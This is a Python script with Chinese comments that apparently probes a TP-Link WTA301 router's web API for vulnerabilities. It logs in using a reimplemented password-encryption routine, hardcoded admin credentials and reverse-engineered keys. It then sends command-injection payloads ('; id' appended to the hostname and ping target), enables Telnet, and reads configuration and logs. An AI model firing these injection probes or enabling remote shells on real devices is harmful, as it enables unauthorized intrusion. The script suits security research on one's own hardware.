#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WTA301 Web 漏洞深度分析脚本
"""

import requests
import json
import base64
import hashlib
import time

# 路由器配置
ROUTER_IP = "192.168.2.1"
USERNAME = "admin"
PASSWORD = "f36gczx9"

# 密码加密密钥（从之前逆向得到）
KEY1 = b"RDpbLfCPsJZ7fiv"
KEY2 = b"yLwVl0zKqws7LgKPRQ84Mdt708T1qQ3Ha7xv3H7NyU84p21BriUWBU43odz3iP4rBL3cD02KZciXTysVXiV8ngg6vL48rPJyAUw0HurW20xqxv9aYb4M9wK1Ae0wlro510qXeU07kV57fQMc8L6aLgMLwygtc0F10a0Dg70TOoouyFhdysuRMO51yY5ZlOZZLEal1h0t9YQW0Ko7oBwmCAHoic4HYbUyVeU3sfQ1xtXcPcf1aT303wAQhv66qzW"

def tp_link_encrypt(password):
    """TP-Link 密码加密算法"""
    # 第一步：MD5 哈希
    md5_hash = hashlib.md5(password.encode()).digest()
    
    # 第二步：用密钥1 XOR
    xor1 = bytes([md5_hash[i] ^ KEY1[i % len(KEY1)] for i in range(len(md5_hash))])
    
    # 第三步：用密钥2 XOR（循环使用）
    xor2 = bytes([xor1[i] ^ KEY2[i % len(KEY2)] for i in range(len(xor1))])
    
    # 第四步：base64 编码
    return base64.b64encode(xor2).decode()

def login():
    """登录获取 stok"""
    encrypted_pwd = tp_link_encrypt(PASSWORD)
    url = f"http://{ROUTER_IP}/ds"
    payload = {
        "method": "do",
        "login": {
            "username": USERNAME,
            "password": encrypted_pwd
        }
    }
    
    print(f"=== 登录 ===")
    print(f"加密后密码: {encrypted_pwd}")
    
    try:
        resp = requests.post(url, json=payload, timeout=5)
        data = resp.json()
        print(f"响应: {json.dumps(data, indent=2)}")
        
        if "stok" in data:
            stok = data["stok"]
            print(f"\n✓ 登录成功！stok: {stok}")
            return stok
        else:
            print(f"\n✗ 登录失败")
            return None
    except Exception as e:
        print(f"登录失败: {e}")
        return None

def api_call(stok, payload):
    """调用 API"""
    url = f"http://{ROUTER_IP}/stok={stok}/ds"
    try:
        resp = requests.post(url, json=payload, timeout=5)
        return resp.json()
    except Exception as e:
        return {"error": str(e)}

def main():
    print("=" * 60)
    print("WTA301 Web 漏洞深度分析")
    print("=" * 60)
    
    # 1. 登录
    stok = login()
    if not stok:
        return
    
    print(f"\n" + "=" * 60)
    print("2. 测试各种 API")
    print("=" * 60)
    
    # 测试 API 列表
    test_apis = [
        # 系统信息
        ("获取系统信息", {"method": "get", "system": {"name": ["sys_info"]}}),
        ("获取设备信息", {"method": "get", "system": {"name": ["device_info"]}}),
        
        # 诊断工具
        ("Ping 测试", {"method": "do", "diagnosis": {"ping": {"target": "127.0.0.1", "count": 1}}}),
        ("Traceroute 测试", {"method": "do", "diagnosis": {"traceroute": {"target": "127.0.0.1"}}}),
        
        # Telnet
        ("开启 Telnet", {"method": "do", "system": {"enable_telnet": None}}),
        
        # 命令注入测试
        ("主机名注入测试", {"method": "do", "system": {"hostname": "test; id"}}),
        ("Ping 注入测试", {"method": "do", "diagnosis": {"ping": {"target": "127.0.0.1; id", "count": 1}}}),
        
        # 获取配置
        ("获取网络配置", {"method": "get", "network": {"name": ["wan"]}}),
        ("获取无线配置", {"method": "get", "wireless": {"name": ["wifi2"]}}),
        
        # 其他可能的 API
        ("获取诊断结果", {"method": "get", "diagnosis": {"name": ["ping_result"]}}),
        ("获取日志", {"method": "get", "system": {"name": ["log"]}}),
    ]
    
    for name, payload in test_apis:
        print(f"\n--- {name} ---")
        result = api_call(stok, payload)
        print(f"请求: {json.dumps(payload, ensure_ascii=False)}")
        print(f"响应: {json.dumps(result, ensure_ascii=False, indent=2)}")
        time.sleep(0.5)
    
    print(f"\n" + "=" * 60)
    print("3. 尝试找诊断输出 API")
    print("=" * 60)
    
    # 先触发一次 Ping
    print("\n触发 Ping...")
    api_call(stok, {"method": "do", "diagnosis": {"ping": {"target": "127.0.0.1", "count": 1}}})
    time.sleep(2)
    
    # 尝试各种获取结果的 API
    result_apis = [
        ("ping_result", {"method": "get", "diagnosis": {"name": ["ping_result"]}}),
        ("ping", {"method": "get", "diagnosis": {"name": ["ping"]}}),
        ("traceroute_result", {"method": "get", "diagnosis": {"name": ["traceroute_result"]}}),
        ("diag_result", {"method": "get", "diagnosis": {"name": ["diag_result"]}}),
        ("result", {"method": "get", "diagnosis": {"name": ["result"]}}),
        ("status", {"method": "get", "diagnosis": {"name": ["status"]}}),
    ]
    
    for name, payload in result_apis:
        print(f"\n尝试 {name}...")
        result = api_call(stok, payload)
        print(f"响应: {json.dumps(result, ensure_ascii=False)}")
        time.sleep(0.3)

if __name__ == "__main__":
    main()
